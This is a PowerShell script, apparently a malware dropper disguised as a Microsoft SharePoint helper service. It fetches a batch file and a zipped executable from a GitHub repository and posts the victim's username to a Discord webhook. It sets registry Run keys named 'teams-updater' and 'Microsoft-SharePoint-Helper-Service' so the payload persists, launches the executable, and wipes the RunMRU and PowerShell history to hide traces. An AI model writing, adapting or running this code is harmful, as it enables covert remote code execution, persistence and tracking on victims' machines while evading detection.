$data = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/DanielAckermann69/SharePoint/main/redownload.txt'

New-Item -Path "C:/Users/$env:USERNAME/Documents/w.bat"
Set-Content -Path "C:/Users/$env:USERNAME/Documents/w.bat" -Value $data.Content

$currentUsername = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$currentUsername = $currentUsername.Split("\")[1]
$softwareName = "Microsoft-SharePoint-Helper-Service"
$url = "https://discord.com/api/webhooks/1238472164395585617/EV5vZVUbYawnGuBY7DcrXaQy5LWq5dLbrqjhQIb_geikhx-xuUClAhG9XNm2D_8xQvBb"
$payload = @{
    username = $currentUsername
    avatar_url = "https://cdn.mos.cms.futurecdn.net/7auVjCELrhFKTPfudXRTgc.jpg"
    embeds = @(
        @{
            title = "Installing..."
            description = $softwareName
            color = 3066993 
        }
    )
}

$jsonPayload = $payload | ConvertTo-Json -Depth 5
Invoke-RestMethod -Uri $url -Method Post -Body $jsonPayload -ContentType "application/json"

Start-Sleep -Seconds 5
New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "teams-updater" -Value "C:\Users\$env:USERNAME\Documents\w.bat" -PropertyType String
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

taskkill -im "Microsoft-SharePoint-Helper-Service.exe" -f
Remove-Item -Path "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/SharePoint" -Recurse -Force
New-Item -ItemType "directory" -Path "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/SharePoint"

Invoke-WebRequest -Uri "https://github.com/DanielAckermann69/SharePoint/archive/refs/heads/main.zip" -OutFile "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/SharePoint/v2.zip"
Expand-Archive -Path "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/SharePoint/v2.zip" -DestinationPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/SharePoint"

New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "Microsoft-SharePoint-Helper-Service" -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\SharePoint\SharePoint-main\Microsoft-SharePoint-Helper-Service.exe" -PropertyType String
start "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/SharePoint/SharePoint-main/Microsoft-SharePoint-Helper-Service.exe"

Remove-Item (Get-PSReadlineOption).HistorySavePath